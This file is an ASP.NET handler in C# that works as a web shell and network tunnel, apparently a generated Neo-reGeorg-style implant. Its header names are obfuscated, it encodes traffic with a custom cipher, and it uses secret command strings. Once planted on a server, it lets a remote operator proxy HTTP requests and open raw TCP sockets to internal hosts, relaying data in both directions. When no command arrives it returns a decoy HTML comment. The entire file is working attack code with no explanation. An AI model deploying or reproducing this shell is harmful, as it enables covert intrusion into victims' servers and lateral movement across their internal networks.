<%@ WebHandler Language="C#" Class="GenericHandler1" %>

using System;
using System.Web;
using System.IO;
using System.Net;
using System.Net.Sockets;

public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSessionState {
    public String StrTr(string input, string frm, string to) {
        String r = "";
        for(int i=0; i < input.Length; i++) {
            int index = frm.IndexOf(input[i]);
            if(index != -1)
                r += to[index];
            else
                r += input[i];
        }
        return r;
    }
    public void ProcessRequest (HttpContext context) {
        try {
            String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            String de = "Q1+6ElgrkvHVBMSGxpUcTNdqbh7AXjewy8Pf2K4IanuoFRZJ5O39CmiD/W0tLYzs";
            String rUrl = context.Request.Headers.Get("Vakzngeuc");
            if (rUrl != null){
                Uri u = new Uri(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(StrTr(rUrl, de, en))));
                WebRequest request = WebRequest.Create(u);
                request.Method = context.Request.HttpMethod;
                
                foreach (string key in context.Request.Headers)
                {
                    if (key != "Vakzngeuc"){
                        try{
                            request.Headers.Add(key, context.Request.Headers.Get(key));
                        } catch (Exception e){}
                    }
                }

                int buffLen = context.Request.ContentLength;
                byte[] buff = new byte[buffLen];
                int c = 0;
                if((c = context.Request.InputStream.Read(buff, 0, buff.Length)) > 0) {
                    System.Text.Encoding.Default.GetString(buff);
                    try{
                        Stream body = request.GetRequestStream();
                        body.Write(buff, 0, buff.Length);
                        body.Close();
                    } catch (Exception e){}
                }

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                WebHeaderCollection webHeader = response.Headers;
                for (int i=0;i < webHeader.Count; i++)
                {
                    string rkey = webHeader.GetKey(i);
                    if (rkey != "Content-Length" && rkey != "Transfer-Encoding")
                        context.Response.AddHeader(rkey, webHeader[i]);
                }

                StreamReader repBody = new StreamReader(response.GetResponseStream(), System.Text.Encoding.GetEncoding("UTF-8"));
                string rbody = repBody.ReadToEnd();
                context.Response.AddHeader("Content-Length", rbody.Length.ToString());
                context.Response.Write(rbody);
                return;
            }

            context.Response.StatusCode = 200;
            String cmd = context.Request.Headers.Get("Reggnqscnglychtxb");
            if (cmd != null) {
                String mark = cmd.Substring(0,22);
                cmd = cmd.Substring(22);
                if (cmd == "FNUoY22YWoKaBgORA4gQ5JBpZ061PAGguz3lX376oGttSdtWr6Lan") {
                    try {
                        String target_str = System.Text.Encoding.Default.GetString(Convert.FromBase64String(StrTr(context.Request.Headers.Get("Brguhxiky"), de, en)));
                        String[] target_ary = target_str.Split('|');
                        String target = target_ary[0];
                        int port = int.Parse(target_ary[1]);
                        IPAddress ip;
                        try {
                            ip = IPAddress.Parse(target);
                        } catch (Exception ex) {
                            IPHostEntry host = Dns.GetHostByName(target);
                            ip = host.AddressList[0];
                        }
                        System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                        Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        sender.Connect(remoteEP);
                        sender.Blocking = false;
                        context.Application[mark] = sender;
                        context.Response.AddHeader("Yletcls", "OY1qUpyX3nz");
                    } catch (Exception ex) {
                        context.Response.AddHeader("Tptgrfds", "g3sqinm3KJYZWM2Cpgrm9TofGcTfl3kHEMcwcLOqPvFnVLpN0v");
                        context.Response.AddHeader("Yletcls", "ry5dn_CPM80QFNvfMF0GC");
                    }
                } else if (cmd == "p3REaB9EkAyqdCBDQMmN3xPX1vOHzrDgnHEZCKDZEE6vNTvWGTho5gAaEqGJ") {
                    try {
                        Socket s = (Socket)context.Application[mark];
                        s.Close();
                    } catch (Exception ex) {
                    }
                    context.Application.Remove(mark);
                } else if (cmd == "2VXU5UIyn") {
                    Socket s = (Socket)context.Application[mark];
                    try {
                        int buffLen = context.Request.ContentLength;
                        byte[] buff = new byte[buffLen];
                        int c = 0;
                        while ((c = context.Request.InputStream.Read(buff, 0, buff.Length)) > 0) {
                            string b64 = StrTr(System.Text.Encoding.Default.GetString(buff), de, en);
                            s.Send(Convert.FromBase64String(b64));
                        }
                        context.Response.AddHeader("Yletcls", "OY1qUpyX3nz");
                    } catch (Exception ex) {
                        context.Response.AddHeader("Tptgrfds", "djsMDIayrozCP20a9RJe_CkL3T4ZtgYFMJyclQA5zhwh_MGynFt2H");
                        context.Response.AddHeader("Yletcls", "ry5dn_CPM80QFNvfMF0GC");
                    }
                } else if (cmd == "UQrDkMUaXh") {
                    try {
                        Socket s = (Socket)context.Application[mark];
                        byte[] readBuff = new byte[513];
                        int maxRead = 524288;
                        int readLen = 0;
                        try {
                            int c = s.Receive(readBuff);
                            while (c > 0) {
                                byte[] newBuff = new byte[c];
                                System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                                string b64 = Convert.ToBase64String(newBuff);
                                context.Response.BinaryWrite(System.Text.Encoding.Default.GetBytes(StrTr(b64, en, de)));
                                readLen += c;
                                if (c < 513 || readLen >= maxRead)
                                    break;
                                c = s.Receive(readBuff);
                            }
                            context.Response.AddHeader("Yletcls", "OY1qUpyX3nz");
                        } catch (SocketException ex) {
                            context.Response.AddHeader("Yletcls", "OY1qUpyX3nz");
                        }

                    } catch (Exception ex) {
                        context.Response.AddHeader("Yletcls", "OY1qUpyX3nz");
                    }
                }
            } else {
                context.Response.Write("<!-- Bemlc3JMD6S5X5Q_qIXJ -->");
            }
        } catch (Exception ex) {
            context.Response.AddHeader("Yletcls", "ry5dn_CPM80QFNvfMF0GC");
        }
    }

    public bool IsReusable {
        get {
            return false;
        }
    }
}
